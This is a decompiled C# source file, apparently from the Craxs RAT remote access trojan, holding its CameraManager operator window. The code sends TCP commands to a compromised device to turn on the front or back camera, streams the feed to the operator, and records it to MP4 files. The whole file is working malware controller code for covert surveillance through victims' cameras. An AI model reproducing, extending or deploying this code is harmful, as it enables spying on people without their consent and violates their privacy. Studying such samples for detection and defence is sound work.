using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Accord.Video.FFMPEG;
using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000AA RID: 170
	[DesignerGenerated]
	public partial class CameraManager : Form
	{
		// Token: 0x06000A90 RID: 2704 RVA: 0x00072FF4 File Offset: 0x000711F4
		public CameraManager()
		{
			base.Load += this.CameraManager_Load;
			base.FormClosing += this.CameraManager_FormClosing;
			this.string_0 = "null";
			this.bool_0 = false;
			this.int_0 = 0;
			this.int_1 = 0;
			this.string_1 = "0 kb";
			this.pictureBox_0 = null;
			this.None = "None";
			this.string_2 = "";
			this.bool_1 = false;
			this.bool_2 = false;
			this.string_3 = "";
			this.string_4 = "null";
			this.bool_3 = false;
			this.int_2 = 25;
			this.InitializeComponent();
		}

		// Token: 0x170002F8 RID: 760
		// (get) Token: 0x06000A93 RID: 2707 RVA: 0x000060DD File Offset: 0x000042DD
		// (set) Token: 0x06000A94 RID: 2708 RVA: 0x0007458C File Offset: 0x0007278C
		internal virtual PictureBox CAM0
		{
			[CompilerGenerated]
			get
			{
				return this._CAM0;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CAM0_Click);
				EventHandler value3 = new EventHandler(this.CAM0_MouseHover);
				EventHandler value4 = new EventHandler(this.CAM0_MouseLeave);
				PaintEventHandler value5 = new PaintEventHandler(this.CAM0_Paint);
				PictureBox cam = this._CAM0;
				if (cam != null)
				{
					cam.Click -= value2;
					cam.MouseHover -= value3;
					cam.MouseLeave -= value4;
					cam.Paint -= value5;
				}
				this._CAM0 = value;
				cam = this._CAM0;
				if (cam != null)
				{
					cam.Click += value2;
					cam.MouseHover += value3;
					cam.MouseLeave += value4;
					cam.Paint += value5;
				}
			}
		}

		// Token: 0x1700030C RID: 780
		// (get) Token: 0x06000A95 RID: 2709 RVA: 0x000060E5 File Offset: 0x000042E5
		// (set) Token: 0x06000A96 RID: 2710 RVA: 0x00074630 File Offset: 0x00072830
		internal virtual Timer Frames
		{
			[CompilerGenerated]
			get
			{
				return this._Frames;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Frames_Tick);
				Timer frames = this._Frames;
				if (frames != null)
				{
					frames.Tick -= value2;
				}
				this._Frames = value;
				frames = this._Frames;
				if (frames != null)
				{
					frames.Tick += value2;
				}
			}
		}

		// Token: 0x1700030D RID: 781
		// (get) Token: 0x06000A97 RID: 2711 RVA: 0x000060ED File Offset: 0x000042ED
		// (set) Token: 0x06000A98 RID: 2712 RVA: 0x00074674 File Offset: 0x00072874
		internal virtual Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x170002F9 RID: 761
		// (get) Token: 0x06000A99 RID: 2713 RVA: 0x000060F5 File Offset: 0x000042F5
		// (set) Token: 0x06000A9A RID: 2714 RVA: 0x000746B8 File Offset: 0x000728B8
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170002FA RID: 762
		// (get) Token: 0x06000A9B RID: 2715 RVA: 0x000060FD File Offset: 0x000042FD
		// (set) Token: 0x06000A9C RID: 2716 RVA: 0x000746CC File Offset: 0x000728CC
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x170002FB RID: 763
		// (get) Token: 0x06000A9D RID: 2717 RVA: 0x00006105 File Offset: 0x00004305
		// (set) Token: 0x06000A9E RID: 2718 RVA: 0x000746E0 File Offset: 0x000728E0
		internal virtual PictureBox ClientPic { get; set; }

		// Token: 0x170002FC RID: 764
		// (get) Token: 0x06000A9F RID: 2719 RVA: 0x0000610D File Offset: 0x0000430D
		// (set) Token: 0x06000AA0 RID: 2720 RVA: 0x000746F4 File Offset: 0x000728F4
		internal virtual Label Label1 { get; set; }

		// Token: 0x170002FD RID: 765
		// (get) Token: 0x06000AA1 RID: 2721 RVA: 0x00006115 File Offset: 0x00004315
		// (set) Token: 0x06000AA2 RID: 2722 RVA: 0x00074708 File Offset: 0x00072908
		internal virtual ComboBox cmbofoucs { get; set; }

		// Token: 0x170002FE RID: 766
		// (get) Token: 0x06000AA3 RID: 2723 RVA: 0x0000611D File Offset: 0x0000431D
		// (set) Token: 0x06000AA4 RID: 2724 RVA: 0x0007471C File Offset: 0x0007291C
		internal virtual Label Label2 { get; set; }

		// Token: 0x170002FF RID: 767
		// (get) Token: 0x06000AA5 RID: 2725 RVA: 0x00006125 File Offset: 0x00004325
		// (set) Token: 0x06000AA6 RID: 2726 RVA: 0x00074730 File Offset: 0x00072930
		internal virtual ComboBox combqulty { get; set; }

		// Token: 0x17000300 RID: 768
		// (get) Token: 0x06000AA7 RID: 2727 RVA: 0x0000612D File Offset: 0x0000432D
		// (set) Token: 0x06000AA8 RID: 2728 RVA: 0x00074744 File Offset: 0x00072944
		internal virtual Panel Panel4 { get; set; }

		// Token: 0x17000301 RID: 769
		// (get) Token: 0x06000AA9 RID: 2729 RVA: 0x00006135 File Offset: 0x00004335
		// (set) Token: 0x06000AAA RID: 2730 RVA: 0x00074758 File Offset: 0x00072958
		internal virtual Label statustext { get; set; }

		// Token: 0x1700030E RID: 782
		// (get) Token: 0x06000AAB RID: 2731 RVA: 0x0000613D File Offset: 0x0000433D
		// (set) Token: 0x06000AAC RID: 2732 RVA: 0x0007476C File Offset: 0x0007296C
		internal virtual ToolTip ToolTip1 { get; set; }

		// Token: 0x17000302 RID: 770
		// (get) Token: 0x06000AAD RID: 2733 RVA: 0x00006145 File Offset: 0x00004345
		// (set) Token: 0x06000AAE RID: 2734 RVA: 0x00074780 File Offset: 0x00072980
		internal virtual DrakeUIButton Fbtn
		{
			[CompilerGenerated]
			get
			{
				return this._Fbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Fbtn_Click);
				DrakeUIButton fbtn = this._Fbtn;
				if (fbtn != null)
				{
					fbtn.Click -= value2;
				}
				this._Fbtn = value;
				fbtn = this._Fbtn;
				if (fbtn != null)
				{
					fbtn.Click += value2;
				}
			}
		}

		// Token: 0x17000303 RID: 771
		// (get) Token: 0x06000AAF RID: 2735 RVA: 0x0000614D File Offset: 0x0000434D
		// (set) Token: 0x06000AB0 RID: 2736 RVA: 0x000747C4 File Offset: 0x000729C4
		internal virtual DrakeUIButton Sbtn
		{
			[CompilerGenerated]
			get
			{
				return this._Sbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Sbtn_Click);
				DrakeUIButton sbtn = this._Sbtn;
				if (sbtn != null)
				{
					sbtn.Click -= value2;
				}
				this._Sbtn = value;
				sbtn = this._Sbtn;
				if (sbtn != null)
				{
					sbtn.Click += value2;
				}
			}
		}

		// Token: 0x17000304 RID: 772
		// (get) Token: 0x06000AB1 RID: 2737 RVA: 0x00006155 File Offset: 0x00004355
		// (set) Token: 0x06000AB2 RID: 2738 RVA: 0x00074808 File Offset: 0x00072A08
		internal virtual DrakeUIButton Bbtn
		{
			[CompilerGenerated]
			get
			{
				return this._Bbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Bbtn_Click);
				DrakeUIButton bbtn = this._Bbtn;
				if (bbtn != null)
				{
					bbtn.Click -= value2;
				}
				this._Bbtn = value;
				bbtn = this._Bbtn;
				if (bbtn != null)
				{
					bbtn.Click += value2;
				}
			}
		}

		// Token: 0x17000305 RID: 773
		// (get) Token: 0x06000AB3 RID: 2739 RVA: 0x0000615D File Offset: 0x0000435D
		// (set) Token: 0x06000AB4 RID: 2740 RVA: 0x0007484C File Offset: 0x00072A4C
		internal virtual DrakeUILampLED DrakeUILampLED1 { get; set; }

		// Token: 0x1700030F RID: 783
		// (get) Token: 0x06000AB5 RID: 2741 RVA: 0x00006165 File Offset: 0x00004365
		// (set) Token: 0x06000AB6 RID: 2742 RVA: 0x00074860 File Offset: 0x00072A60
		internal virtual DrakeUIToolTip DrakeUIToolTip1 { get; set; }

		// Token: 0x17000306 RID: 774
		// (get) Token: 0x06000AB7 RID: 2743 RVA: 0x0000616D File Offset: 0x0000436D
		// (set) Token: 0x06000AB8 RID: 2744 RVA: 0x00074874 File Offset: 0x00072A74
		internal virtual DrakeUIAvatar Button3
		{
			[CompilerGenerated]
			get
			{
				return this._Button3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				DrakeUIAvatar button = this._Button3;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button3 = value;
				button = this._Button3;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x17000307 RID: 775
		// (get) Token: 0x06000AB9 RID: 2745 RVA: 0x00006175 File Offset: 0x00004375
		// (set) Token: 0x06000ABA RID: 2746 RVA: 0x000748B8 File Offset: 0x00072AB8
		internal virtual DrakeUIAvatar DrakeUIAvatar2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIAvatar2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIAvatar2_Click);
				DrakeUIAvatar drakeUIAvatar = this._DrakeUIAvatar2;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click -= value2;
				}
				this._DrakeUIAvatar2 = value;
				drakeUIAvatar = this._DrakeUIAvatar2;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click += value2;
				}
			}
		}

		// Token: 0x17000308 RID: 776
		// (get) Token: 0x06000ABB RID: 2747 RVA: 0x0000617D File Offset: 0x0000437D
		// (set) Token: 0x06000ABC RID: 2748 RVA: 0x000748FC File Offset: 0x00072AFC
		internal virtual Label combotext { get; set; }

		// Token: 0x17000309 RID: 777
		// (get) Token: 0x06000ABD RID: 2749 RVA: 0x00006185 File Offset: 0x00004385
		// (set) Token: 0x06000ABE RID: 2750 RVA: 0x00074910 File Offset: 0x00072B10
		public virtual DrakeUIComboBox combosizes { get; set; }

		// Token: 0x1700030A RID: 778
		// (get) Token: 0x06000ABF RID: 2751 RVA: 0x0000618D File Offset: 0x0000438D
		// (set) Token: 0x06000AC0 RID: 2752 RVA: 0x00074924 File Offset: 0x00072B24
		internal virtual Label qultytext { get; set; }

		// Token: 0x1700030B RID: 779
		// (get) Token: 0x06000AC1 RID: 2753 RVA: 0x00006195 File Offset: 0x00004395
		// (set) Token: 0x06000AC2 RID: 2754 RVA: 0x00074938 File Offset: 0x00072B38
		public virtual DrakeUIComboBox comboqualty { get; set; }

		// Token: 0x06000AC3 RID: 2755 RVA: 0x0007494C File Offset: 0x00072B4C
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x06000AC4 RID: 2756 RVA: 0x00074994 File Offset: 0x00072B94
		public void method_1(object[] objects_0)
		{
			if (base.InvokeRequired)
			{
				CameraManager.GDelegate16 method = new CameraManager.GDelegate16(this.method_1);
				base.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				string[] array = (string[])objects_0[0];
				if (array != null && array.Length > 0)
				{
					foreach (string text in array)
					{
						this.combosizes.Items.Add(text.Replace("[", "").Replace("]", ""));
					}
					this.combosizes.Text = array[0];
					this.combosizes.MaxDropDownItems = array.Length;
				}
			}
		}

		// Token: 0x06000AC5 RID: 2757 RVA: 0x00074A48 File Offset: 0x00072C48
		private void CameraManager_Load(object sender, EventArgs e)
		{
			base.Tag = "Cam_" + this.gclass8_2.string_9;
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\6.ico");
			this.combqulty.Text = "Auto";
			this.cmbofoucs.Text = "No";
			this.Frames.Start();
			this.ClientPic.Image = (Image)this.gclass8_2.objects_1[0];
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			base.Focus();
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06000AC6 RID: 2758 RVA: 0x00074B04 File Offset: 0x00072D04
		private void Frames_Tick(object sender, EventArgs e)
		{
			this.int_0 = this.int_1;
			this.int_1 = 0;
			this.string_1 = "0 kb";
		}

		// Token: 0x06000AC7 RID: 2759 RVA: 0x0000246D File Offset: 0x0000066D
		private void CAM0_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000AC8 RID: 2760 RVA: 0x0000246D File Offset: 0x0000066D
		private void CAM0_MouseHover(object sender, EventArgs e)
		{
		}

		// Token: 0x06000AC9 RID: 2761 RVA: 0x0000246D File Offset: 0x0000066D
		private void CAM0_MouseLeave(object sender, EventArgs e)
		{
		}

		// Token: 0x06000ACA RID: 2762 RVA: 0x00074B30 File Offset: 0x00072D30
		private void CAM0_Paint(object sender, PaintEventArgs e)
		{
			string text = "";
			this.Text = string.Concat(new string[]
			{
				this.gclass8_2.string_1,
				" FPS : <",
				Conversions.ToString(this.int_0),
				"> - SPEED : <",
				this.string_1,
				">"
			});
			SizeF sizeF = default(SizeF);
			sizeF = e.Graphics.MeasureString(text, Module8.font_1);
			Rectangle rect = checked(new Rectangle(5, 5, (int)Math.Round((double)sizeF.Width), (int)Math.Round((double)sizeF.Height)));
			Color color_ = Module5.color_0;
			e.Graphics.FillRectangle(new Pen(Color.FromArgb(200, (int)color_.R, (int)color_.G, (int)color_.B)).Brush, rect);
			e.Graphics.DrawString(text, Module8.font_1, new SolidBrush(Module5.White), 5f, 5f);
		}

		// Token: 0x06000ACB RID: 2763 RVA: 0x00074C30 File Offset: 0x00072E30
		public Image method_8(Image image)
		{
			try
			{
				this.pictureBox_0.Image = image;
				if (this.pictureBox_0 != null)
				{
					string none = this.None;
					if (Operators.CompareString(none, "Right", false) == 0)
					{
						this.pictureBox_0.Image.RotateFlip(RotateFlipType.Rotate90FlipNone);
						this.pictureBox_0.Tag = "90n";
					}
					else if (Operators.CompareString(none, "Left", false) != 0)
					{
						if (Operators.CompareString(none, "Up", false) == 0)
						{
							this.pictureBox_0.Image.RotateFlip(RotateFlipType.Rotate180FlipX);
							this.pictureBox_0.Tag = "180x";
						}
						else if (Operators.CompareString(none, "Down", false) == 0)
						{
							this.pictureBox_0.Image.RotateFlip(RotateFlipType.RotateNoneFlipX);
							this.pictureBox_0.Tag = "180y";
						}
					}
					else
					{
						this.pictureBox_0.Image.RotateFlip(RotateFlipType.Rotate270FlipNone);
						this.pictureBox_0.Tag = "270n";
					}
					return this.pictureBox_0.Image;
				}
			}
			catch (Exception ex)
			{
			}
			return null;
		}

		// Token: 0x06000ACC RID: 2764 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_9(object sender, EventArgs e)
		{
		}

		// Token: 0x06000ACD RID: 2765 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_10(object sender, EventArgs e)
		{
		}

		// Token: 0x06000ACE RID: 2766 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_11(object sender, EventArgs e)
		{
		}

		// Token: 0x06000ACF RID: 2767 RVA: 0x00074D5C File Offset: 0x00072F5C
		private void CameraManager_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.bool_1 = false;
			this.DrakeUILampLED1.Enabled = false;
			this.DrakeUILampLED1.Visible = false;
			this.DrakeUILampLED1.Blink = false;
			try
			{
				if (this.bool_1 && this.videoFileWriter_0 != null)
				{
					this.bool_1 = false;
					this.videoFileWriter_0.Close();
				}
			}
			catch (Exception ex)
			{
			}
			this.DrakeUILampLED1.Dispose();
			this.Frames.Enabled = false;
			if (this.bool_3 && this.gclass8_0 != null)
			{
				this.gclass8_0.bool_2 = true;
				this.gclass8_0.method_6(this.tcpClient_0);
			}
		}

		// Token: 0x06000AD0 RID: 2768 RVA: 0x00074E24 File Offset: 0x00073024
		public void method_12(string string_0)
		{
			try
			{
				if (this.gclass8_2 != null && Operators.CompareString(this.string_4, "null", false) != 0)
				{
					GClass8 gclass = this.gclass8_2;
					TcpClient tcpClient = this.tcpClient_1;
					string[] array = gclass.string_0.Split(new char[]
					{
						':'
					});
					int value;
					if (Operators.CompareString(this.cmbofoucs.Text, "Yes", false) != 0)
					{
						value = 0;
					}
					else
					{
						value = 1;
					}
					int value2;
					if (Operators.CompareString(this.combqulty.Text, "Auto", false) == 0)
					{
						value2 = 1;
					}
					else
					{
						value2 = 0;
					}
					string text = "";
					string text2 = "";
					try
					{
						if (this.combosizes.Visible)
						{
							string[] array2 = this.combosizes.Text.Split(new char[]
							{
								'x'
							});
							text = array2[0];
							text2 = array2[1];
						}
					}
					catch (Exception ex)
					{
						text = Conversions.ToString(460);
						text2 = Conversions.ToString(840);
					}
					string text3 = this.comboqualty.Text;
					if (this.gclass8_1.bool_13)
					{
						object[] objects_ = new object[]
						{
							tcpClient,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								string_0,
								",",
								text,
								",",
								text2,
								",",
								text3,
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_4,
								GClass9.string_0,
								Conversions.ToString(value),
								GClass9.string_0,
								Conversions.ToString(value2),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								gclass.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							gclass
						};
						gclass.method_2(objects_);
					}
					else
					{
						object[] objects_2 = new object[]
						{
							tcpClient,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								string_0,
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_4,
								GClass9.string_0,
								Conversions.ToString(value),
								GClass9.string_0,
								Conversions.ToString(value2),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								gclass.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							gclass
						};
						gclass.method_2(objects_2);
					}
					this.CAM0.Image = Module0.onloading;
					this.statustext.Text = "Please Wait....";
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000AD1 RID: 2769 RVA: 0x00075170 File Offset: 0x00073370
		private void Fbtn_Click(object sender, EventArgs e)
		{
			if (Operators.ConditionalCompareObjectEqual(this.Fbtn.Tag, "off", false))
			{
				this.Bbtn.Tag = "off";
				this.statustext.Text = "Selected : Front Camera, Please Wait...";
				this.Fbtn.Tag = "on";
				this.Sbtn.Enabled = true;
				this.Fbtn.Enabled = false;
				this.Bbtn.Enabled = false;
				this.string_4 = "1";
				this.method_12("1");
				this.string_3 = "Front Camera";
			}
		}

		// Token: 0x06000AD2 RID: 2770 RVA: 0x0007520C File Offset: 0x0007340C
		private void Sbtn_Click(object sender, EventArgs e)
		{
			if (this.bool_3)
			{
				this.bool_3 = false;
				if (this.gclass8_0 != null)
				{
					this.statustext.Text = "Select Camera...";
					this.gclass8_0.bool_2 = true;
					this.gclass8_0.method_6(this.tcpClient_0);
				}
			}
			this.CAM0.Image = null;
			this.Sbtn.Enabled = false;
			this.Fbtn.Enabled = true;
			this.Bbtn.Enabled = true;
			this.Button3.Enabled = false;
			this.Bbtn.Tag = "off";
			this.Fbtn.Tag = "off";
		}

		// Token: 0x06000AD3 RID: 2771 RVA: 0x000752C0 File Offset: 0x000734C0
		private void Bbtn_Click(object sender, EventArgs e)
		{
			if (Operators.ConditionalCompareObjectEqual(this.Bbtn.Tag, "off", false))
			{
				this.Fbtn.Tag = "off";
				this.statustext.Text = "Selected : Back Camera, Please Wait...";
				this.Bbtn.Tag = "on";
				this.Sbtn.Enabled = true;
				this.Fbtn.Enabled = false;
				this.Bbtn.Enabled = false;
				this.string_4 = "0";
				this.method_12("0");
				this.string_3 = "Back Camera";
			}
		}

		// Token: 0x06000AD4 RID: 2772 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_16(object sender, EventArgs e)
		{
		}

		// Token: 0x06000AD5 RID: 2773 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_17(object sender, EventArgs e)
		{
		}

		// Token: 0x06000AD6 RID: 2774 RVA: 0x0007535C File Offset: 0x0007355C
		private void Button3_Click(object sender, EventArgs e)
		{
			if (this.CAM0.Image != null)
			{
				if (Operators.CompareString(this.Button3.Tag.ToString(), "off", false) == 0)
				{
					this.DrakeUILampLED1.Enabled = true;
					this.DrakeUILampLED1.Visible = true;
					this.DrakeUILampLED1.Blink = true;
					this.Button3.Tag = "on";
					this.Button3.Symbol = 62094;
					this.Button3.ForeColor = Color.Lime;
					this.videoFileWriter_0 = new VideoFileWriter();
					object right = DateTime.Now.ToString("yyyy-MM-dd_HH-mmss") + ".mp4";
					if (!Directory.Exists(this.string_2 + "\\Camera Manager"))
					{
						Directory.CreateDirectory(this.string_2 + "\\Camera Manager");
					}
					int width = Module2.smethod_0(this.CAM0.Width, 2);
					int height = Module2.smethod_0(this.CAM0.Height, 2);
					this.int_2 = Conversions.ToInteger(MySettingsProperty.Settings.live_fps_rec);
					this.videoFileWriter_0.Open(Conversions.ToString(Operators.ConcatenateObject(this.string_2 + "\\Camera Manager\\", right)), width, height, this.int_2, VideoCodec.MPEG4);
					this.bool_1 = true;
				}
				else if (Operators.CompareString(this.Button3.Tag.ToString(), "on", false) == 0)
				{
					this.DrakeUILampLED1.Enabled = false;
					this.DrakeUILampLED1.Visible = false;
					this.DrakeUILampLED1.Blink = false;
					this.Button3.Tag = "off";
					this.Button3.ForeColor = Color.FromArgb(157, 5, 17);
					this.Button3.Symbol = 61469;
					this.videoFileWriter_0.Close();
					string text = this.string_2 + "\\Camera Manager";
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					Process.Start(text);
					this.Button3.ForeColor = Color.White;
					this.Button3.BackColor = Color.Transparent;
					this.bool_1 = false;
				}
			}
		}

		// Token: 0x06000AD7 RID: 2775 RVA: 0x000755A4 File Offset: 0x000737A4
		private void DrakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (this.CAM0.Image != null)
			{
				if (Operators.CompareString(this.None, "Right", false) != 0)
				{
					if (Operators.CompareString(this.None, "Down", false) == 0)
					{
						this.None = "Left";
					}
					else if (Operators.CompareString(this.None, "Left", false) == 0)
					{
						this.None = "Up";
					}
					else if (Operators.CompareString(this.None, "Up", false) != 0)
					{
						this.None = "Right";
					}
					else
					{
						this.None = "Right";
					}
				}
				else
				{
					this.None = "Down";
				}
			}
		}

		// Token: 0x04000605 RID: 1541
		public TcpClient tcpClient_0;

		// Token: 0x04000606 RID: 1542
		public GClass8 gclass8_0;

		// Token: 0x04000607 RID: 1543
		public GClass8 gclass8_1;

		// Token: 0x04000608 RID: 1544
		public TcpClient tcpClient_1;

		// Token: 0x04000609 RID: 1545
		public GClass8 gclass8_2;

		// Token: 0x0400060A RID: 1546
		public string string_0;

		// Token: 0x0400060B RID: 1547
		private bool bool_0;

		// Token: 0x0400060C RID: 1548
		public int int_0;

		// Token: 0x0400060D RID: 1549
		public int int_1;

		// Token: 0x0400060E RID: 1550
		public string string_1;

		// Token: 0x0400060F RID: 1551
		public PictureBox pictureBox_0;

		// Token: 0x04000610 RID: 1552
		public string None;

		// Token: 0x04000611 RID: 1553
		public string string_2;

		// Token: 0x04000612 RID: 1554
		public bool bool_1;

		// Token: 0x04000613 RID: 1555
		public bool bool_2;

		// Token: 0x04000614 RID: 1556
		public string string_3;

		// Token: 0x04000615 RID: 1557
		public string string_4;

		// Token: 0x04000616 RID: 1558
		public bool bool_3;

		// Token: 0x04000617 RID: 1559
		public VideoFileWriter videoFileWriter_0;

		// Token: 0x04000618 RID: 1560
		private int int_2;

		// Token: 0x020000AB RID: 171
		// (Invoke) Token: 0x06000ADB RID: 2779
		public delegate void GDelegate16(object[] objects_0);
	}
}
